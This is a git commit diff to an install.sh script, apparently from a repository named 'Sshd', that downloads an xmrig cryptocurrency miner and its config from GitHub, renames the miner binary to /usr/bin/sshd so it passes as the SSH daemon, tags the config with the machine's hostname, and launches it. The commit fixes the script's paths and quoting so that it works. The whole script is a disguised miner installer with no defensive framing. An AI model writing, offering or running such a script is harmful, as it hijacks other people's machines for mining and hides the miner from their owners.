6be59ccbe16defc568959e2c371aa730ca8b3f4e
Hackme258 <146896274+Hackme258@users.noreply.github.com>
2023-11-30 01:59:53 +0100

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,24 +1,22 @@
 #!/bin/bash
+set -x
 
 #le nom
 nom=$(cat /etc/hostname | head -1)
-
-#espace de travail
-mkdir /tmp/mx
 
 #wget le miner
 wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"
 
 #decompresse
-mv xmrig.tgz /tmp/mx/xmrig.tgz
 tar -zxvf xmrig.tgz
-mv /tmp/mx/minerd /usr/bin/sshd
+mv minerd /usr/bin/sshd
 
 #wget la config
 wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
 mkdir /root/.config
-sed -i 's/nom_machine/$nom/g' xmrig.json
+sed -i "s/nom_machine/$nom/g" xmrig.json
 mv xmrig.json /root/.config/xmrig.json
 
 #lancement
 /usr/bin/sshd
+
